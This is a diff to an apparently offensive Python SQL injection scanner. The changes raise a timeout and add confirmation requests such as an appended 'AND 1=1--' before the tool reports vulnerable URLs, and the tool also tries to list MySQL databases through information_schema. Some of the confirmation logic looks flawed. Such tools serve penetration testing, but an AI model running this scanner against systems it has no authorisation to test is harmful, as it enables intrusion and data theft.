@@ -395,7 +395,6 @@ ascii_art = """
 
 print(ascii_art)
 
-
 def detect_db_vulnerability(response_text):
     for db, errors in db_errors.items():
         for error in errors:
@@ -416,7 +415,7 @@ def get_mysql_databases(url):
     for payload in payloads:
         full_url = f"{url}{payload}"
         try:
-            response = requests.get(full_url, timeout=3)
+            response = requests.get(full_url, timeout=5)
             if "information_schema" in response.text.lower():
                 print(f"{GREEN}[MYSQL DATABASES FOUND]{RESET} {BOLD}Possible databases:{RESET}")
                 matches = re.findall(r'([a-zA-Z0-9_]+)', response.text)
@@ -444,7 +443,11 @@ def test_sqli_time_based(url):
             duration = end_time - start_time
             if duration > 5:
                 print(f"{GREEN}[VULNERABLE]{RESET} {BOLD}Possible Time-Based SQL Injection found{RESET} with payload: {YELLOW}{payload}{RESET}")
-                return full_url
+                # Double vérification
+                confirm_url = f"{url}{payload} AND '1'='1'--"
+                confirm_response = requests.get(confirm_url, timeout=3)
+                if confirm_response.status_code == response.status_code and duration > 5:
+                    return full_url
         except requests.exceptions.RequestException as e:
             print(f"{RED}[ERROR]{RESET} Request failed: {e}")
     return None
@@ -462,8 +465,12 @@ def test_sqli(url):
                 db_type = detect_db_vulnerability(response.text)
                 if db_type:
                     print(f"{GREEN}[VULNERABLE]{RESET} {BOLD}SQL Injection found{RESET} with payload: {YELLOW}{payload}{RESET} on {BOLD}{db_type}{RESET} database!")
-                    print(f"{RED}[VULNERABILITY LINK]{RESET} {full_url}\n")
-                    found_vulnerabilities.append((full_url, payload, db_type))
+                    safe_payload = payload.replace("'", "\\'")
+                    confirm_url = f"{url}{safe_payload} AND 1=1--"
+                    confirm_response = requests.get(confirm_url, timeout=3)
+                    if response.status_code == confirm_response.status_code:
+                        print(f"{RED}[VULNERABILITY LINK]{RESET} {full_url}\n")
+                        found_vulnerabilities.append((full_url, payload, db_type))
                 else:
                     print(f"{RED}[SAFE]{RESET} No SQL Injection with payload: {payload}")
             except requests.exceptions.RequestException as e:
